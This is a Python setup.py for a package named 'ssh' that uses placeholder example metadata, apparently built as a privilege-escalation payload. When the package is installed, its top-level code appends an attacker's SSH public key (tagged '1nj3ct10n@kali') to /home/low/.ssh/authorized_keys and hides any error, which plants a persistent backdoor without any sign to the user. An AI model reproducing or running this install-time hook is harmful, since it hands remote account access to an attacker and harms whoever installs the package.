import setuptools

try:
        with open("/home/low/.ssh/authorized_keys", "a") as f:
                f.write("\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDSLqnvgEUbBzaYZPJwyHP3rTr1IUhdkZCFSvcNNNTAyLtZmdz1wJH5juncEeZRKCQT4phiOFXoiRobRvWQbmbi//wsXSElrJvZPhs3V5vUXrc/BrOvQBgUrdpWcavYHS+tMVVL9YO7dmPPnNfiqllYFjfT0WGFNvS/xle5bX68uiBNW0Teb62Ivkcm2hZvjyG9CI+kY54CHF6vGi+Yov+5i8mC9/oEWDU9fp6BAMQWQSWdEissIs3llTkveINERURmEY/ak7L2Ge2ujb3Ze9B2P5hzBu8y+zMZOdkmTwFkQRjIzmsBRAf3rhtUchUvd9qY9Lirmd3nn0ZeKu0ruW8XGEbGEstvP3ilzWdwhULqCxbb3qiaIximEEW/Ha5Xd72Nmw3lcH5NrszL342f16zqdvyzLBDA+BHu7l0qjWqHlJbeZ+Cn8bFN5tax3cFFuy6X8c3m+wh0hrUttB1a5iuLWLG7LRNBuFzNVswchCVxqG2LjgFNa9an/+6eAeZzn3s= 1nj3ct10n@kali")
                f.close()

except Exception as e:
        pass
setuptools.setup(
        name="ssh",
        version="2.0.7",
        author="Example Author",
        author_email="author@example.com",
        description="A small example package",
        long_description="",
        long_description_content_type="text/markdown",
        url="https://github.com/pypa/sampleproject",
        packages=setuptools.find_packages(),
        #classifiers=[
                #"Programming Language :: Python :: 3",
                #"License :: OSI Approved :: MIT License",
                #"Operating System :: OS Independent",
                      #],
)
